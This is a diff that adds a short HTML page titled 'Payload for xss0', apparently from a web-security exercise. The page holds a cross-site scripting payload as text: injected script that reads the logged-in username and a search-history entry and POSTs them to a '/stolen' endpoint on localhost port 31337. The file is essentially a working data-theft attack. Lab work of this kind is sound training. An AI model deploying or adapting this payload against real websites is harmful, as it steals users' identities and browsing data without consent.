@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+<body>
+    <h3>Payload for xss0</h3>
+    <b></b>
+    <div id="payload"></div>
+    <script>
+        document.getElementById('payload').textContent =
+        "<script>window.onload=(e)=>{xx=document.getElementById('logged-in-user').textContent;hsl=document.getElementsByClassName('history-item list-group-item')[1].textContent;if(xx==undefined){xx='';}if(hsl==undefined){hsl='';}const report_url='https://localhost:31337/stolen?user='+xx+'&last_search='+hsl;$.ajax({type: 'POST',url: report_url,});}<\/script>"
+    </script>
+</body>
+</html>
